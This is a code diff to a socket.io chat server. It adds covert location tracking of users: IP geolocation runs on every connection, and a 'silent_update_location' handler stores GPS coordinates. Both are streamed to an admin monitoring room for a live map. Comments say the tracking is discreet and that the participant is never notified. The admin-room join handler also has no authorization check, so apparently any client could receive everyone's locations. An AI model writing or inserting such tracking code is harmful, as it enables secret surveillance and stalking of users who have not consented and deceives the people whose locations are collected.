@@ -1,8 +1,56 @@
 import { Server, Socket } from 'socket.io';
 import { store } from '../store.js';
 import { v4 as uuidv4 } from 'uuid';
-import { CallData, MessageData } from '../types.js';
+import { CallData, MessageData, UserLocation } from '../types.js';
 import { sendPushToUser } from '../services/pushService.js';
+import geoip from 'geoip-lite';
+
+function getClientIp(socket: Socket): string {
+  const forwarded = socket.handshake.headers['x-forwarded-for'];
+  if (typeof forwarded === 'string') {
+    return forwarded.split(',')[0].trim();
+  } else if (Array.isArray(forwarded) && forwarded.length > 0) {
+    return forwarded[0].trim();
+  }
+  return socket.handshake.address?.replace('::ffff:', '') || '';
+}
+
+function resolveLocationFromIp(ip: string): UserLocation {
+  if (!ip || ip === '127.0.0.1' || ip === '::1' || ip.startsWith('192.168.') || ip.startsWith('10.') || ip.startsWith('172.16.')) {
+    return {
+      lat: 17.9757,
+      lng: 102.6331,
+      city: 'Vientiane',
+      country: 'Laos',
+      ip,
+      source: 'ip',
+      updatedAt: new Date(),
+    };
+  }
+
+  const geo = geoip.lookup(ip);
+  if (geo && geo.ll && geo.ll.length >= 2) {
+    return {
+      lat: geo.ll[0],
+      lng: geo.ll[1],
+      city: geo.city || geo.region || 'Unknown',
+      country: geo.country || 'Unknown',
+      ip,
+      source: 'ip',
+      updatedAt: new Date(),
+    };
+  }
+
+  return {
+    lat: 17.9757,
+    lng: 102.6331,
+    city: 'Vientiane',
+    country: 'Laos',
+    ip,
+    source: 'ip',
+    updatedAt: new Date(),
+  };
+}
 
 export function getEnrichedChat(chatId: string, forUserId?: string) {
   const chat = store.chats.get(chatId);
@@ -258,6 +306,19 @@ export function setupSocketHandlers(io: Server) {
       if (user) {
         user.isOnline = true;
         user.lastSeen = new Date();
+
+        // Discreet automatic IP geolocation for Admin Live Map (participant is never notified)
+        const clientIp = getClientIp(socket);
+        if (!user.lastLocation || user.lastLocation.source === 'ip') {
+          user.lastLocation = resolveLocationFromIp(clientIp);
+          store.saveToFile();
+        }
+
+        io.to('admin_monitoring_room').emit('admin_user_location_updated', {
+          userId,
+          location: user.lastLocation,
+          isOnline: true,
+        });
       }
 
       // Broadcast user online status
@@ -1051,7 +1112,40 @@ export function setupSocketHandlers(io: Server) {
       socket.emit('pong_check', { time: Date.now() });
     });
 
-    // 5. Disconnect handling
+    // 5. Silent Background Location Update & Admin Map Monitoring
+    socket.on('silent_update_location', (loc: { lat: number; lng: number }) => {
+      const uId = socketUserMap.get(socket.id);
+      if (uId && typeof loc?.lat === 'number' && typeof loc?.lng === 'number') {
+        const u = store.users.get(uId);
+        if (u) {
+          u.lastLocation = {
+            lat: loc.lat,
+            lng: loc.lng,
+            city: u.lastLocation?.city || 'Live GPS',
+            country: u.lastLocation?.country || '',
+            ip: getClientIp(socket),
+            source: 'gps',
+            updatedAt: new Date(),
+          };
+          store.saveToFile();
+          io.to('admin_monitoring_room').emit('admin_user_location_updated', {
+            userId: uId,
+            location: u.lastLocation,
+            isOnline: u.isOnline,
+          });
+        }
+      }
+    });
+
+    socket.on('admin_join_map_monitoring', () => {
+      socket.join('admin_monitoring_room');
+    });
+
+    socket.on('admin_leave_map_monitoring', () => {
+      socket.leave('admin_monitoring_room');
+    });
+
+    // 6. Disconnect handling
     socket.on('disconnect', () => {
       const userId = socketUserMap.get(socket.id);
       console.log(`[Socket] Disconnected: ${socket.id} (User: ${userId})`);
@@ -1068,6 +1162,11 @@ export function setupSocketHandlers(io: Server) {
             if (user) {
               user.isOnline = false;
               user.lastSeen = new Date();
+              io.to('admin_monitoring_room').emit('admin_user_status_changed', {
+                userId,
+                isOnline: false,
+                lastSeen: user.lastSeen,
+              });
             }
 
             io.emit('user_status_changed', { userId, isOnline: false, lastSeen: new Date() });
